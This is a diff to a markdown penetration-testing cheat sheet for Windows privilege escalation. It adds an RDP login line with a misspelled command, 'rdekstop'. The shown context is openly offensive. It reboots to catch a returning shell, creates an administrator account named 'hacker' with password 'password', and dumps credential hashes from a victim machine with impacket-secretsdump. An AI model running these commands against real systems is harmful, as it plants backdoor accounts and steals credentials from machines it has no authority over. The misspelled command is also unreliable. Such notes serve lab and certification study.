@@ -544,7 +544,7 @@ sc qc "Some vulnerable service" #if the above failed check the privledges above 
 whoami /priv #if the above failed check to see if you have shutdown privledges
 shutdown /r /t 0 #wait for a shell to comeback
 ````
-### Adding a user with high privs to RDP into the machine
+### Adding a user with high privs
 ````
 net user hacker password /add
 net localgroup Administrators hacker /add
@@ -554,6 +554,7 @@ net users #check the new user
 ````
 ````
 impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes 
+rdekstop -u hacker -p password <IP of victim machine>
 ````
 ## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
 
